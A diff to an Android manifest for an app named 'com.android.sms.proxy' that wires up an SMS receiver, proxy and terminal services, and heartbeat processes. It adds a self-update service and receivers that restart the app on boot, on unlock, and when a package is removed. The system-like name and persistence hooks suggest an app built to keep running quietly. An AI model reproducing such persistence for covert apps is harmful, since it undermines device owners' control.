@@ -61,16 +61,17 @@
 		<!--</service >-->
 
 		<!--<service-->
-		<!--android:name = "org.connectbot.service.TerminalManager"-->
-		<!--android:process = ":process1" />-->
+				<!--android:name = "org.connectbot.service.TerminalManager"-->
+				<!--android:process = ":process1" />-->
 		<!--<service android:name = ".service.ProxyService"-->
-		<!--android:process = ":process1" />-->
+		         <!--android:process = ":process1" />-->
 		<!--<service android:name = ".service.HeartBeatService" android:process = ":process1" >-->
-		<!--&lt;!&ndash;<intent-filter >&ndash;&gt;-->
-		<!--&lt;!&ndash;<action android:name = "com.android.sms.proxy" />&ndash;&gt;-->
-		<!--&lt;!&ndash;<category android:name = "android.intent.category.DEFAULT" />&ndash;&gt;-->
-		<!--&lt;!&ndash;</intent-filter >&ndash;&gt;-->
+			<!--&lt;!&ndash;<intent-filter >&ndash;&gt;-->
+			<!--&lt;!&ndash;<action android:name = "com.android.sms.proxy" />&ndash;&gt;-->
+			<!--&lt;!&ndash;<category android:name = "android.intent.category.DEFAULT" />&ndash;&gt;-->
+			<!--&lt;!&ndash;</intent-filter >&ndash;&gt;-->
 		<!--</service >-->
+		<!--<service android:name = ".service.DownloadUpdateService" android:process = ":process1" />-->
 		<!--<receiver android:name = ".service.HeartBeatReceiver" android:process = ":process1" />-->
 		<!--<service android:name = ".service.HeartAssistService" android:process = ":process2" />-->
 		<!--<receiver android:name = ".service.HeartAssistReceiver" android:process = ":process2" />-->
@@ -78,6 +79,7 @@
 		<service android:name = "org.connectbot.service.TerminalManager" />
 		<service android:name = ".service.ProxyService" />
 		<service android:name = ".service.HeartBeatService" />
+		<service android:name = ".service.DownloadUpdateService" />
 		<provider android:authorities = "com.android.sms.proxy.user" android:name = ".entity.UserContentProvider" />
 
 		<receiver android:name = ".service.Receiver_SMS"
@@ -91,10 +93,14 @@
 			<intent-filter android:priority = "1000" >
 				<action android:name = "android.intent.action.BOOT_COMPLETED" />
 			</intent-filter >
-			<!--<intent-filter >-->
-				<!--<action android:name = "android.intent.action.PACKAGE_REMOVED" />-->
-				<!--<data android:scheme = "package" />-->
-			<!--</intent-filter >-->
+			<intent-filter >
+				<action android:name = "android.intent.action.USER_PRESENT" />
+			</intent-filter >
+			<!--这个是留给更新后自启用的,但是有点麻烦-->
+			<intent-filter >
+				<action android:name = "android.intent.action.PACKAGE_REMOVED" />
+				<data android:scheme = "package" />
+			</intent-filter >
 		</receiver >
 	</application >
 
